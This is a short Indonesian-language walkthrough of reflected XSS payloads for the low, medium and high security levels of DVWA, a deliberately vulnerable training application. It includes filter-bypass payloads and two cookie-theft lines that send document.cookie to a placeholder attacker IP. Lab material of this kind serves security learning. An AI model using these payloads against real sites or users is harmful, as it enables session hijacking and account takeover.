# XSS (Reflected)
Reflected cross-site scripting (XSS) muncul saat aplikasi menerima data dalam permintaan HTTP dan menyertakan data tersebut dalam respons langsung dengan cara yang tidak aman.

## Security Low
Menampilkan cookie halaman
```sh
<input onfocus=javascript:alert(document.cookie) autofocus>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/xss%20stored/xss%20stored%201.JPG)

Melakukan pencurian cookie
```sh
<input onfocus=javascript:window.location='http://<IP_Attacker>/?cookie='+document.cookie autofocus>
```

![alt text](https://github.com/rahardian-dwi-saputra/dvwa-tricks/blob/main/assets/xss%20stored/xss%20stored%202.JPG)

## Security Medium
Menampilkan cookie halaman
```sh
<scr<script>ipt>alert(document.cookie);</script>
```

Melakukan pencurian cookie
```sh
<scr<script>ipt>window.location='http://<IP_Attacker>/?cookie='+document.cookie;</script>
```

## Security High
Menampilkan cookie halaman
```sh
<img src/onerror=alert(document.cookie)>
```
